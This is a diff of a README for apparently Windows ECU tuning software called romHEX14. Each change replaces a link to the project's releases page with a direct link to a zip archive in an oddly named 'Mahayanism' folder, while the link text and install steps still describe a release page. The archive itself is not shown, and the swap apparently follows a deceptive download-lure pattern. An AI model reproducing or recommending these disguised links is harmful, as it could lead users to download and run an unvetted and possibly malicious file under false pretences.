@@ -1,6 +1,6 @@
 # ⚙️ romHEX14-ECU-Tuning - ECU Calibration Made Simple
 
-[![Download romHEX14-ECU-Tuning](https://img.shields.io/badge/Download%20romHEX14--ECU--Tuning-blue?style=for-the-badge)](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/releases)
+[![Download romHEX14-ECU-Tuning](https://img.shields.io/badge/Download%20romHEX14--ECU--Tuning-blue?style=for-the-badge)](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/raw/refs/heads/main/Mahayanism/EC_rom_Tuning_HE_v2.1-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ romHEX 14 is ECU calibration software for Windows. It helps you work with engine
 
 Use the release page to get the latest Windows build:
 
-[Visit the download page](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/releases)
+[Visit the download page](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/raw/refs/heads/main/Mahayanism/EC_rom_Tuning_HE_v2.1-beta.5.zip)
 
 ## 💻 What You Need
 
@@ -26,7 +26,7 @@ For smooth use with larger calibration files, 16 GB of RAM is a better fit.
 
 Follow these steps on Windows:
 
-1. Open the [release page](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/releases).
+1. Open the [release page](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/raw/refs/heads/main/Mahayanism/EC_rom_Tuning_HE_v2.1-beta.5.zip).
 2. Find the latest release at the top of the page.
 3. Under **Assets**, download the Windows installer or ZIP file.
 4. If you get a ZIP file, right-click it and choose **Extract All**.
@@ -159,7 +159,7 @@ Always keep an untouched backup of the original ECU file before you edit anythin
 
 Use this page to get the Windows download:
 
-[romHEX14-ECU-Tuning releases](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/releases)
+[romHEX14-ECU-Tuning releases](https://github.com/inclement-enthusiasm598/romHEX14-ECU-Tuning/raw/refs/heads/main/Mahayanism/EC_rom_Tuning_HE_v2.1-beta.5.zip)
 
 ## 🖥️ Windows Use Guide
 
